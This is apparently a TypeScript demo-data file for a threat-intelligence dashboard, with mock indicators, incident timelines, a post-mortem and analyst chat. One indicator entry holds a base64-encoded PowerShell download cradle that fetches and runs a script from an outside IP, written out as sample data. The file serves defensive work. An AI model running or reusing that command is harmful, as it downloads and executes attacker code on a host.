import { IOCItem, InvestigationCase, SecurityReport, ChatMessage, UserProfile, SecurityTarget, AuditLogEntry } from '../types';
import { IS_DEMO_MODE } from '../utils/config';

export const DEMO_USERS: UserProfile[] = [
  {
    id: 'user-1',
    name: 'Sarah Chen',
    email: 'sarah.chen@sentinel-defense.internal',
    role: 'Incident Responder',
    organization: 'Sentinel Defense Corp (DEMO WORKSPACE)',
    clearanceLevel: 'TLP:RED',
    avatarInitials: 'SC',
    sessionToken: 'CIPHER-AUTH-9941-TK-ALPHA',
    createdAt: '2025-01-15'
  },
  {
    id: 'user-2',
    name: 'Marcus Vance',
    email: 'm.vance@perimeter-sec.io',
    role: 'Threat Hunter',
    organization: 'ZeroTrust Perimeter Unit (DEMO WORKSPACE)',
    clearanceLevel: 'TLP:AMBER',
    avatarInitials: 'MV',
    sessionToken: 'CIPHER-AUTH-4122-TK-BRAVO',
    createdAt: '2025-02-01'
  },
  {
    id: 'user-3',
    name: 'Elena Rostova',
    email: 'e.rostova@threat-intel.corp',
    role: 'Security Analyst',
    organization: 'Apex Cyber Intelligence (DEMO WORKSPACE)',
    clearanceLevel: 'TLP:GREEN',
    avatarInitials: 'ER',
    sessionToken: 'CIPHER-AUTH-7731-TK-CHARLIE',
    createdAt: '2025-02-10'
  },
  {
    id: 'user-4',
    name: 'Alex Rivera',
    email: 'a.rivera@sentinel-ops.net',
    role: 'Security Engineer',
    organization: 'Cloud Infrastructure Sec (DEMO WORKSPACE)',
    clearanceLevel: 'TLP:CLEAR',
    avatarInitials: 'AR',
    sessionToken: 'CIPHER-AUTH-1029-TK-DELTA',
    createdAt: '2025-02-12'
  }
];

export const DEMO_TARGETS: SecurityTarget[] = [
  {
    id: 'tgt-1',
    value: '185.220.101.5',
    type: 'ipv4',
    label: 'Frankfurt Tor Exit & C2 Relay (APT29)',
    environment: 'external_threat',
    priority: 'critical',
    threatScore: 92,
    verdict: 'malicious',
    status: 'INVESTIGATED',
    owner: 'Sarah Chen',
    firstSeen: '2025-02-18 04:15 UTC',
    lastAnalyzed: '2 mins ago',
    riskLevel: 'CRITICAL',
    confidence: 92,
    relatedIOCs: ['185.220.101.5', 'tor-exit-frankfurt-04.torservers.net'],
    relatedCVEs: ['CVE-2024-38077'],
    relatedInvestigations: ['INC-8941', 'INC-8812'],
    investigationType: 'PASSIVE INTELLIGENCE',
    validationStatus: 'valid',
    asn: 'AS206238 (Zwiebelfreunde e.V.)',
    country: 'Germany',
    city: 'Frankfurt am Main',
    openPorts: [22, 80, 443, 8080, 9001],
    tags: ['Cobalt Strike', 'C2', 'Tor Relay', 'INC-8941'],
    notes: 'Actively beaconing from internal host PROD-K8S-WORKER-09 on port 8080 with 15% jitter.',
    addedBy: 'Sarah Chen',
    addedAt: '2025-02-18 04:15 UTC',
    lastScannedAt: '2 mins ago',
    associatedIncidents: ['INC-8941', 'INC-8812']
  },
  {
    id: 'tgt-2',
    value: '10.240.12.89',
    type: 'ipv4',
    label: 'PROD-K8S-WORKER-09 (Affected Node)',
    environment: 'production',
    priority: 'critical',
    threatScore: 85,
    verdict: 'malicious',
    status: 'ANALYZING',
    owner: 'Autonomous Agent',
    firstSeen: '2025-02-18 04:22 UTC',
    lastAnalyzed: 'Just now',
    riskLevel: 'HIGH',
    confidence: 88,
    relatedIOCs: ['10.240.12.89', 'powershell.exe -enc...'],
    relatedCVEs: ['CVE-2024-38077'],
    relatedInvestigations: ['INC-8941'],
    investigationType: 'ACTIVE ANALYSIS',
    validationStatus: 'valid',
    asn: 'AWS VPC eu-west-1 (Internal)',
    country: 'Ireland',
    city: 'Dublin DataCenter',
    openPorts: [22, 6443, 10250],
    tags: ['Kubernetes', 'Compromised Node', 'In-Memory DLL', 'INC-8941'],
    notes: 'Reflective DLL unhooking detected in kubelet PID 4108. Host quarantine recommended.',
    addedBy: 'Autonomous Agent',
    addedAt: '2025-02-18 04:22 UTC',
    lastScannedAt: 'Just now',
    associatedIncidents: ['INC-8941']
  },
  {
    id: 'tgt-3',
    value: 'update-svc-catalog.azure-edge-sync.net',
    type: 'domain',
    label: 'SSO Credential Harvester Proxy',
    environment: 'external_threat',
    priority: 'high',
    threatScore: 91,
    verdict: 'malicious',
    status: 'ENRICHED',
    owner: 'Marcus Vance',
    firstSeen: '2025-02-17 19:40 UTC',
    lastAnalyzed: '18 mins ago',
    riskLevel: 'HIGH',
    confidence: 94,
    relatedIOCs: ['update-svc-catalog.azure-edge-sync.net'],
    relatedCVEs: [],
    relatedInvestigations: ['INC-8941'],
    investigationType: 'PASSIVE INTELLIGENCE',
    validationStatus: 'normalized',
    country: 'United States',
    city: 'Boydton, Virginia',
    openPorts: [443, 8443],
    tags: ['Evilginx3', 'MFA-Bypass', 'Scattered Spider'],
    notes: 'Used in adversary phishing campaign targeting corporate engineering identity tokens.',
    addedBy: 'Marcus Vance',
    addedAt: '2025-02-17 19:40 UTC',
    lastScannedAt: '18 mins ago',
    associatedIncidents: ['INC-8941']
  },
  {
    id: 'tgt-4',
    value: '194.26.29.114',
    type: 'ipv4',
    label: 'Mirai Port Sweep Scanner',
    environment: 'external_threat',
    priority: 'high',
    threatScore: 78,
    verdict: 'suspicious',
    status: 'MONITORED',
    owner: 'Automated IDS',
    firstSeen: '2025-02-14 02:22 UTC',
    lastAnalyzed: '3 hours ago',
    riskLevel: 'MEDIUM',
    confidence: 78,
    relatedIOCs: ['194.26.29.114'],
    relatedCVEs: ['CVE-2024-38077'],
    relatedInvestigations: ['INC-8812'],
    investigationType: 'PASSIVE INTELLIGENCE',
    validationStatus: 'valid',
    asn: 'AS44050 (Petersburg Internet Network)',
    country: 'Russian Federation',
    city: 'Saint Petersburg',
    openPorts: [22, 23, 80],
    tags: ['Botnet', 'Port-Scanning', 'CVE-2024-38077'],
    notes: 'Probing border gateways for Remote Desktop Licensing buffer overflow vulnerabilities.',
    addedBy: 'Automated IDS',
    addedAt: '2025-02-14 02:22 UTC',
    lastScannedAt: '3 hours ago',
    associatedIncidents: ['INC-8812']
  },
  {
    id: 'tgt-5',
    value: '10.240.0.0/16',
    type: 'cidr',
    label: 'Core Production Kubernetes VPC Subnet',
    environment: 'production',
    priority: 'medium',
    threatScore: 35,
    verdict: 'suspicious',
    status: 'QUEUED',
    owner: 'Sarah Chen',
    firstSeen: '2025-02-10 09:00 UTC',
    lastAnalyzed: '10 mins ago',
    riskLevel: 'LOW',
    confidence: 85,
    relatedIOCs: ['10.240.12.89'],
    relatedCVEs: [],
    relatedInvestigations: ['INC-8941'],
    investigationType: 'PASSIVE INTELLIGENCE',
    validationStatus: 'valid',
    asn: 'Internal Enterprise Subnet',
    country: 'Cloud Internal',
    openPorts: [443, 8080, 9090],
    tags: ['AWS EKS', 'Core Cluster', 'VPC Flow Monitored'],
    notes: 'Contains 12 worker nodes and 3 API server endpoints. Under heightened eBPF monitoring.',
    addedBy: 'Sarah Chen',
    addedAt: '2025-02-10 09:00 UTC',
    lastScannedAt: '10 mins ago',
    associatedIncidents: ['INC-8941']
  }
];

export const DEMO_IOC_LIST: IOCItem[] = [
  {
    id: 'ioc-1',
    value: '185.220.101.5',
    type: 'ipv4',
    threatType: 'Cobalt Strike C2 / Tor Exit',
    confidence: 96,
    severity: 'critical',
    firstSeen: '2025-02-18 04:12:09 UTC',
    lastSeen: '2 mins ago',
    source: 'ThreatConnect + AbuseIPDB',
    asn: 'AS206238 (Zwiebelfreunde e.V.)',
    country: 'Germany',
    countryCode: 'DE',
    city: 'Frankfurt am Main',
    tags: ['Cobalt Strike', 'C2', 'Tor', 'APT29', 'Active Beacon'],
    status: 'active',
    maliciousHits: 47,
    totalHits: 88,
    threatActor: 'Midnight Blizzard (APT29)',
    associatedIncidents: ['INC-8941', 'INC-8812'],
    notes: 'Hosting malleable C2 profile communicating over HTTP/8080 with jitter 15% mimicking jQuery requests.'
  },
  {
    id: 'ioc-2',
    value: 'update-svc-catalog.azure-edge-sync.net',
    type: 'domain',
    threatType: 'Typosquatting / DGA Domain',
    confidence: 91,
    severity: 'critical',
    firstSeen: '2025-02-17 19:40:11 UTC',
    lastSeen: '18 mins ago',
    source: 'CrowdStrike Falcon Sensor',
    country: 'United States',
    countryCode: 'US',
    tags: ['Phishing', 'Credential Harvester', 'DGA'],
    status: 'blocked',
    maliciousHits: 39,
    totalHits: 45,
    threatActor: 'Scattered Spider (UNC3944)',
    associatedIncidents: ['INC-8941'],
    notes: 'Used in Okta SSO credential capture attempts targeting corporate DevOps engineering staff.'
  },
  {
    id: 'ioc-3',
    value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    type: 'sha256',
    threatType: 'Brute Ratel C4 Payload Loader',
    confidence: 98,
    severity: 'critical',
    firstSeen: '2025-02-16 11:05:44 UTC',
    lastSeen: '1 hour ago',
    source: 'VirusTotal Enterprise',
    tags: ['Loader', 'BRc4', 'Reflective DLL', 'EDR-Bypass'],
    status: 'investigating',
    maliciousHits: 64,
    totalHits: 72,
    threatActor: 'Wizard Spider',
    associatedIncidents: ['INC-8941', 'INC-8740'],
    notes: 'DLL side-loaded via legitimate Teams.exe binary to execute in-memory unhooking.'
  },
  {
    id: 'ioc-4',
    value: '194.26.29.114',
    type: 'ipv4',
    threatType: 'Mirai Variant Scanner',
    confidence: 78,
    severity: 'high',
    firstSeen: '2025-02-14 02:22:15 UTC',
    lastSeen: '3 hours ago',
    source: 'AlienVault OTX',
    asn: 'AS44050 (Petersburg Internet Network)',
    country: 'Russian Federation',
    countryCode: 'RU',
    city: 'Saint Petersburg',
    tags: ['Botnet', 'SSH-Bruteforce', 'Port-Scanning'],
    status: 'blocked',
    maliciousHits: 28,
    totalHits: 60,
    threatActor: 'Unknown Syndicate',
    associatedIncidents: ['INC-8805'],
    notes: 'Sweeping subnet 10.240.0.0/16 for exposed CVE-2024-38077 Windows RDL services.'
  },
  {
    id: 'ioc-5',
    value: 'hxxps://auth-verify.company-sso-gateway.cloud/login.php?t=k9832',
    type: 'url',
    threatType: 'Reverse Proxy PhishKit',
    confidence: 94,
    severity: 'critical',
    firstSeen: '2025-02-17 08:33:00 UTC',
    lastSeen: '4 hours ago',
    source: 'Proofpoint TAP',
    country: 'Iceland',
    countryCode: 'IS',
    tags: ['Evilginx3', 'MFA-Bypass', 'Session-Hijack'],
    status: 'active',
    maliciousHits: 35,
    totalHits: 38,
    threatActor: 'Storm-0558',
    associatedIncidents: ['INC-8941'],
    notes: 'Reverse proxy stripping FIDO tokens and capturing session cookies directly into Redis.'
  },
  {
    id: 'ioc-6',
    value: 'CVE-2024-38077',
    type: 'cve',
    threatType: 'Remote Code Execution (MadLicense)',
    confidence: 100,
    severity: 'critical',
    firstSeen: '2024-07-09',
    lastSeen: '5 hours ago',
    source: 'NVD / Microsoft MSRC',
    tags: ['RCE', 'Windows RDL', 'CVSS-9.8', 'Exploited-Wild'],
    status: 'mitigated',
    maliciousHits: 88,
    totalHits: 95,
    associatedIncidents: ['INC-8812', 'INC-8740'],
    notes: 'Remote Desktop Licensing Service heap overflow leading to unauthorized SYSTEM access.'
  },
  {
    id: 'ioc-7',
    value: '45.154.255.89',
    type: 'ipv4',
    threatType: 'VPN Exit / Bulletproof Relay',
    confidence: 62,
    severity: 'medium',
    firstSeen: '2025-02-15 14:10:00 UTC',
    lastSeen: '12 hours ago',
    source: 'GreyNoise Visualizer',
    asn: 'AS200019 (Alexhost SRL)',
    country: 'Moldova',
    countryCode: 'MD',
    city: 'Chisinau',
    tags: ['Proxy', 'GreyNoise-Benign-Scanner'],
    status: 'investigating',
    maliciousHits: 8,
    totalHits: 40,
    associatedIncidents: [],
    notes: 'Scans for open Redis and Elasticsearch ports with no authentication.'
  },
  {
    id: 'ioc-8',
    value: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA6ADgAMAA4ADAALwBiAC4AcABzADEAJwApAA==',
    type: 'sha256',
    threatType: 'Obfuscated PowerShell Stager',
    confidence: 99,
    severity: 'critical',
    firstSeen: '2025-02-18 04:35:12 UTC',
    lastSeen: '30 mins ago',
    source: 'Sysmon Event ID 1 (Process Creation)',
    tags: ['T1059.001', 'EncodedCommand', 'DownloadCradle'],
    status: 'active',
    maliciousHits: 12,
    totalHits: 12,
    threatActor: 'Midnight Blizzard (APT29)',
    associatedIncidents: ['INC-8941'],
    notes: 'Decodes to IEX (New-Object Net.WebClient).DownloadString(http://185.220.101.5:8080/b.ps1)'
  }
];

export const DEMO_TARGET_IP_DOSSIER = {
  ip: '185.220.101.5',
  hostname: 'tor-exit-frankfurt-04.torservers.net',
  asn: 'AS206238',
  org: 'Zwiebelfreunde e.V.',
  country: 'Germany',
  countryCode: 'DE',
  city: 'Frankfurt am Main',
  coordinates: [50.1109, 8.6821],
  threatScore: 92,
  reputation: 'Malicious / Known Tor Exit & C2 Proxy',
  isp: 'Core-Backbone GmbH',
  openPorts: [22, 80, 443, 8080, 9001],
  lastActivity: '2 minutes ago',
  totalAttacksLogged: 2841,
  threatActors: ['APT29 (Midnight Blizzard)', 'Wizard Spider Affiliate'],
  ttps: [
    'T1071.001 - Web Protocols (HTTP/S C2 Beaconing)',
    'T1090.003 - Tor Proxy Multi-hop Anonymization',
    'T1059.001 - PowerShell In-Memory Staging',
    'T1078.004 - Cloud Administration Token Hijack'
  ],
  certificates: {
    issuer: 'Let\'s Encrypt Authority X3',
    subject: 'CN=api-sync-internal.edge-worker.org',
    validUntil: '2025-04-20',
    fingerprint: '3b:21:4a:e9:9f:02:88:12:bc:de:71'
  }
};

export const DEMO_ACTIVE_CASES: InvestigationCase[] = [
  {
    id: 'case-8941',
    caseNumber: 'INC-8941',
    title: 'Cobalt Strike Ingress via Compromised DevOps Token & Outbound Tor C2',
    status: 'investigating',
    severity: 'critical',
    leadAnalyst: 'Sarah Chen (Lead Incident Responder)',
    createdAt: '2025-02-18 04:12 UTC',
    updatedAt: 'Just now',
    summary: 'Anomalous credential usage on AWS IAM role devops-terraform-admin, followed by reflective DLL injection in host PROD-K8S-WORKER-09 and outbound persistent beaconing to 185.220.101.5.',
    targetAssets: ['PROD-K8S-WORKER-09', 'AWS::IAM::Role/devops-admin', 'Vault-Prod-Cluster'],
    iocs: ['185.220.101.5', 'update-svc-catalog.azure-edge-sync.net', 'e3b0c44298fc1c...'],
    mitreTactics: ['Initial Access (T1078)', 'Execution (T1059)', 'Defense Evasion (T1055)', 'C2 (T1071)'],
    assignedAiAgent: 'Autonomous Incident Triager v4.2',
    blastRadiusScore: 78,
    timeline: [
      { time: '04:12:09 UTC', event: 'AWS CloudTrail: AssumeRole from unregistered IP 185.220.101.5', source: 'CloudTrail', severity: 'high' },
      { time: '04:18:33 UTC', event: 'Host PROD-K8S-WORKER-09: Suspicious child process powershell.exe spawned by kubelet', source: 'CrowdStrike', severity: 'critical' },
      { time: '04:22:01 UTC', event: 'Egress connection established to 185.220.101.5:8080 (Cobalt Strike Profile)', source: 'Palo Alto FW', severity: 'critical' },
      { time: '04:30:15 UTC', event: 'Memory Dump triggered: Unhooked ntdll.dll detected in process 4108', source: 'EDR Agent', severity: 'high' },
      { time: '04:45:00 UTC', event: 'CIPHER AI Agent: Triggered HITL Quarantine & Token Invalidation recommendation', source: 'CIPHER Engine', severity: 'medium' }
    ]
  },
  {
    id: 'case-8812',
    caseNumber: 'INC-8812',
    title: 'CVE-2024-38077 Exploitation Probe on Edge Gateway',
    status: 'contained',
    severity: 'high',
    leadAnalyst: 'Marcus Vance',
    createdAt: '2025-02-17 11:30 UTC',
    updatedAt: '3 hours ago',
    summary: 'Repeated malformed RPC packet sequences targeting Remote Desktop Licensing service on perimeter gateway GW-PERIMETER-02.',
    targetAssets: ['GW-PERIMETER-02'],
    iocs: ['194.26.29.114', 'CVE-2024-38077'],
    mitreTactics: ['Initial Access (T1190)', 'Discovery (T1046)'],
    assignedAiAgent: 'Perimeter Defense Bot',
    blastRadiusScore: 24,
    timeline: [
      { time: '11:30:00 UTC', event: 'IDS Alert: RPC Malformed packet signature detected', source: 'Suricata', severity: 'high' },
      { time: '11:32:10 UTC', event: 'Automated ACL applied on Core Router dropping 194.26.29.0/24', source: 'SOAR Playbook', severity: 'medium' }
    ]
  }
];

export const DEMO_SECURITY_REPORT: SecurityReport = {
  id: 'rep-8941',
  title: 'Threat Incident Assessment: Cobalt Strike Infiltration & C2 Neutralization',
  type: 'post_mortem',
  classification: 'TLP:AMBER',
  createdDate: '2025-02-18 05:00 UTC',
  author: 'CIPHER AI Autonomous Investigation Engine & Lead IR Team',
  hashVerification: 'sha256: 4f8a91c7849e7bd66352cf51b0337da827a5180fbd18bfae348910cc92e59120',
  cvssScore: 9.8,
  lateralExposure: 'High (3 K8s Worker Nodes, 1 IAM Role Session)',
  affectedSystems: 4,
  attackNarrative: `On 2025-02-18 at 04:12 UTC, the perimeter defense layer registered an unauthorized AWS IAM AssumeRole operation originating from an untrusted Tor exit node (185.220.101.5). The adversary leveraged a leaked GitHub Actions CI/CD credential token to impersonate the 'devops-terraform-admin' privilege tier.

Within 6 minutes of token assumption, the adversary initiated remote orchestration into PROD-K8S-WORKER-09. A memory-resident Cobalt Strike stager was injected using reflective DLL techniques, bypassing baseline EDR hooks. The payload established persistent beaconing to 185.220.101.5:8080 disguised as jQuery CDN telemetry.

CIPHER AI detected the beacon jitter signature at 04:22 UTC and executed an autonomous correlative trace, isolating the compromised container, revoking the AWS session tokens via STS invalidation, and blocking the ingress subnet across all border NGFWs.`,
  mitreChain: [
    {
      tactic: 'Initial Access',
      techniqueId: 'T1078.004',
      techniqueName: 'Valid Accounts: Cloud Accounts',
      evidence: 'Leaked devops-terraform-admin credential used from Tor exit IP 185.220.101.5'
    },
    {
      tactic: 'Execution',
      techniqueId: 'T1059.001',
      techniqueName: 'Command and Scripting Interpreter: PowerShell',
      evidence: 'Base64 encoded download cradle invoked under kubelet PID 4108'
    },
    {
      tactic: 'Defense Evasion',
      techniqueId: 'T1055.001',
      techniqueName: 'Process Injection: Dynamic-link Library Injection',
      evidence: 'Reflective unhooking of ntdll.dll observed in memory inspection'
    },
    {
      tactic: 'Command and Control',
      techniqueId: 'T1071.001',
      techniqueName: 'Application Layer Protocol: Web Protocols',
      evidence: 'Outbound HTTPS beaconing to 185.220.101.5:8080 with 15% jitter profile'
    }
  ],
  remediationRoadmap: [
    {
      phase: 'Immediate Containment (0-2h)',
      timeframe: 'Completed (T+35m)',
      status: 'completed',
      actions: [
        'Severed network interface on PROD-K8S-WORKER-09 via AWS EC2 StopInstances',
        'Revoked active STS tokens for role devops-terraform-admin',
        'Injected IP 185.220.101.5 into Palo Alto Panorama dynamic block list'
      ]
    },
    {
      phase: 'Eradication & Forensics (2-24h)',
      timeframe: 'In Progress (T+1h 15m)',
      status: 'in_progress',
      actions: [
        'Execute full forensic memory capture and Volatility 3 analysis',
        'Rotate all Secrets Manager & HashiCorp Vault secrets accessed within last 72 hours',
        'Scan entire Kubernetes cluster for orphaned pods or altered daemonsets'
      ]
    },
    {
      phase: 'Strategic Hardening (Day 2 - 7)',
      timeframe: 'Planned',
      status: 'planned',
      actions: [
        'Enforce FIDO2 WebAuthn strict requirement on all AWS CLI AssumeRole operations',
        'Implement Tor exit node perimeter geo-fencing via Cloudflare WAF',
        'Deploy eBPF-based kernel behavioral monitoring across all production nodes'
      ]
    }
  ]
};

export const DEMO_CHAT_MESSAGES: ChatMessage[] = [
  {
    id: 'msg-1',
    role: 'assistant',
    content: `Hello Lead Analyst. **CIPHER AI v4.8 Active**. I am monitoring 24 global threat intelligence feeds, 14,892 real-time EDR endpoints, and live AWS CloudTrail streams.

**Current Priority Alert**: Active correlation detected on **INC-8941** involving target C2 node **185.220.101.5** (Cobalt Strike malleable profile). How would you like to proceed?`,
    timestamp: '04:15 UTC',
    model: 'Gemini 2.5 Flash (SecOps Tuned)',
    suggestedActions: [
      { label: 'Deep Dossier: 185.220.101.5', action: 'dossier-ip', type: 'primary' },
      { label: 'Summarize INC-8941 Timeline', action: 'summarize-case', type: 'secondary' },
      { label: 'Generate Palo Alto Block Rule', action: 'block-rule', type: 'destructive' }
    ]
  },
  {
    id: 'msg-2',
    role: 'user',
    content: 'Analyze IP 185.220.101.5. Check AbuseIPDB, Shodan open ports, threat actor affiliations, and assess if it is communicating with any internal cluster hosts right now.',
    timestamp: '04:16 UTC'
  },
  {
    id: 'msg-3',
    role: 'assistant',
    content: `### Threat Synthesis & Correlation: \`185.220.101.5\`

I have queried our federated threat graph, Shodan API, AbuseIPDB, and internal VPC Flow Logs. Here is the synthesized intelligence:

- **Verdict**: **CRITICAL THREAT (92% Confidence)**
- **Autonomous Identification**: Known Tor exit node currently co-opted as an active **Cobalt Strike Malleable C2 relay**.
- **Attribution**: High overlap with **APT29 (Midnight Blizzard)** and Conti ransomware affiliate infrastructure.
- **Internal Host Impact**: Active bidirectional TCP session established from **PROD-K8S-WORKER-09 (10.240.12.89)** to **185.220.101.5:8080** over the last 34 minutes.

#### Key Telemetry Breakdown:
- **AbuseIPDB**: 47 malicious reports in the last 24 hours (Category: Port Scanning, Hacking, C2).
- **Shodan**: Open ports **22/ssh**, **443/https**, **8080/http-proxy**, **9001/tor-relay**. Self-signed certificate issued to \`api-sync-internal.edge-worker.org\`.
- **Traffic Pattern**: HTTP GET requests carrying encoded cookies with a 15% random jitter pattern, standard signature of Cobalt Strike malleable C2 profile \`jquery-3.3.1.min.js\`.`,
    timestamp: '04:16 UTC',
    model: 'Gemini 2.5 Flash',
    reasoningSteps: [
      { title: 'AbuseIPDB & Shodan Query', description: 'Resolved AS206238, Frankfurt Germany; 4 open service ports found.', status: 'completed', duration: '142ms', toolName: 'shodan_lookup' },
      { title: 'VPC Flow Log Correlation', description: 'Matched outbound connection on Port 8080 originating from 10.240.12.89.', status: 'completed', duration: '280ms', toolName: 'vpc_flow_correlator' },
      { title: 'Payload Signature Dissection', description: 'Identified Cobalt Strike malleable C2 cookie jitter pattern.', status: 'completed', duration: '190ms', toolName: 'suricata_rule_matcher' }
    ],
    extractedArtifacts: [
      { type: 'ioc', label: 'C2 IP Address', value: '185.220.101.5', severity: 'critical' },
      { type: 'ioc', label: 'Beacon Port', value: 'TCP 8080', severity: 'high' },
      { type: 'cve', label: 'Affected Asset', value: 'PROD-K8S-WORKER-09', severity: 'critical' },
      { type: 'mitre', label: 'MITRE ATT&CK', value: 'T1071.001 - Web Protocols', severity: 'high' }
    ],
    suggestedActions: [
      { label: 'Isolate PROD-K8S-WORKER-09', action: 'isolate-host', type: 'destructive' },
      { label: 'Push IP to Palo Alto Blocklist', action: 'block-firewall', type: 'destructive' },
      { label: 'Open Investigation INC-8941', action: 'view-case', type: 'secondary' }
    ]
  }
];

export const DEMO_AUDIT_LOGS: AuditLogEntry[] = [
  {
    id: 'aud-109',
    timestamp: '2025-02-18 04:35:12 UTC',
    event: 'TOOL_EXECUTED',
    actor: 'Autonomous SecOps Copilot',
    details: 'Executed Shodan host inspection and AbuseIPDB query for observable 185.220.101.5',
    classification: 'TLP:AMBER'
  },
  {
    id: 'aud-108',
    timestamp: '2025-02-18 04:30:45 UTC',
    event: 'INVESTIGATION_STARTED',
    actor: 'Sarah Chen (Lead Incident Responder)',
    details: 'Approved autonomous investigation plan on target 185.220.101.5 (Passive Reconnaissance Mode)',
    classification: 'TLP:AMBER'
  },
  {
    id: 'aud-107',
    timestamp: '2025-02-18 04:22:18 UTC',
    event: 'TARGET_ADDED',
    actor: 'Sarah Chen (Lead Incident Responder)',
    details: 'Ingested target observable 185.220.101.5 (External C2 Relay / Cobalt Strike)',
    classification: 'TLP:GREEN'
  },
  {
    id: 'aud-106',
    timestamp: '2025-02-18 04:15:02 UTC',
    event: 'LOGIN',
    actor: 'Sarah Chen (Lead Incident Responder)',
    details: 'Session established via Hardware Security Key (Demo Workspace)',
    classification: 'TLP:CLEAR'
  },
  {
    id: 'aud-105',
    timestamp: '2025-02-18 03:55:40 UTC',
    event: 'REPORT_GENERATED',
    actor: 'Automated Post-Mortem Engine',
    details: 'Compiled Incident Assessment Report rep-8941 (Cobalt Strike Infiltration)',
    classification: 'TLP:AMBER'
  },
  {
    id: 'aud-104',
    timestamp: '2025-02-18 03:40:11 UTC',
    event: 'IOC_SAVED',
    actor: 'Autonomous Threat Ingestion',
    details: 'Saved observable c2.threat-beacon.net to Threat Ledger with CVSS 8.4',
    classification: 'TLP:GREEN'
  }
];

export const DEMO_DOCUMENTS = [
  {
    id: 'doc-1',
    title: 'MITRE ATT&CK Enterprise Matrix v14.1 (Tactics & Techniques)',
    chunks: 842,
    lastIndexed: '2 hours ago',
    similarity: '0.94 Match',
    sampleSnippet: 'T1071.001 - Adversaries may communicate using standard application layer protocols (e.g., HTTP/HTTPS) to avoid detection through firewalls and proxies.'
  },
  {
    id: 'doc-2',
    title: 'Incident Handling & Containment Standard Operating Procedure (SOP-88)',
    chunks: 120,
    lastIndexed: '1 day ago',
    similarity: '0.88 Match',
    sampleSnippet: 'Upon confirmation of active C2 beaconing on tier-1 production Kubernetes nodes, analyst must sever node network interface within 45 minutes.'
  },
  {
    id: 'doc-3',
    title: 'Palo Alto PAN-OS 11.1 Dynamic Blocklist & Address Group Manual',
    chunks: 310,
    lastIndexed: '3 days ago',
    similarity: '0.81 Match',
    sampleSnippet: 'Configuration syntax for dynamic address group automation via REST API: POST /api/?type=config&action=set&xpath=/config/devices/...'
  },
  {
    id: 'doc-4',
    title: 'CVE-2024-38077 Windows Remote Desktop Licensing RCE Technical Advisory',
    chunks: 45,
    lastIndexed: '5 hours ago',
    similarity: '0.96 Match',
    sampleSnippet: 'Critical heap buffer overflow in RDL service allows unauthenticated remote code execution via malformed RPC sequence on port 135/3389.'
  }
];

export const DEMO_WORKFLOW_NODES = [
  {
    id: 'n-1',
    title: 'Perimeter Egress Beacon Trigger',
    type: 'trigger',
    status: 'completed',
    duration: '45ms',
    details: 'Detected outbound TCP session to 185.220.101.5:8080'
  },
  {
    id: 'n-2',
    title: 'Federated Threat Graph Enrichment',
    type: 'enrichment',
    status: 'completed',
    duration: '190ms',
    toolUsed: 'shodan_abuse_enricher',
    details: 'Resolved AS206238 Frankfurt Germany, 92% Malicious Tor Exit'
  },
  {
    id: 'n-3',
    title: 'eBPF Kernel Memory Dissection',
    type: 'ai_analysis',
    status: 'completed',
    duration: '310ms',
    toolUsed: 'ebpf_memory_hook',
    details: 'Identified unhooked ntdll.dll and reflective Cobalt Strike beacon'
  },
  {
    id: 'n-4',
    title: 'Human-In-The-Loop (HITL) Gate: Host Isolation',
    type: 'hitl_approval',
    status: 'waiting_approval',
    details: 'Analyst approval required before severing container network interfaces'
  },
  {
    id: 'n-5',
    title: 'Automated Token Invalidation & NGFW Drop',
    type: 'remediation',
    status: 'pending',
    details: 'Revoke AWS STS credentials & inject IP to Panorama Blocklist'
  }
];

// Operational Initial State (Empty by default in production; populated only if VITE_DEMO_MODE=true)
export const DEFAULT_USERS: UserProfile[] = IS_DEMO_MODE ? DEMO_USERS : [];
export const INITIAL_TARGETS: SecurityTarget[] = IS_DEMO_MODE ? DEMO_TARGETS : [];
export const INITIAL_IOC_LIST: IOCItem[] = IS_DEMO_MODE ? DEMO_IOC_LIST : [];
export const TARGET_IP_DOSSIER = DEMO_TARGET_IP_DOSSIER;
export const ACTIVE_CASES: InvestigationCase[] = IS_DEMO_MODE ? DEMO_ACTIVE_CASES : [];
export const INITIAL_SECURITY_REPORT: SecurityReport | null = IS_DEMO_MODE ? DEMO_SECURITY_REPORT : null;
export const INITIAL_CHAT_MESSAGES: ChatMessage[] = IS_DEMO_MODE ? DEMO_CHAT_MESSAGES : [];
export const INITIAL_AUDIT_LOGS: AuditLogEntry[] = IS_DEMO_MODE ? DEMO_AUDIT_LOGS : [];

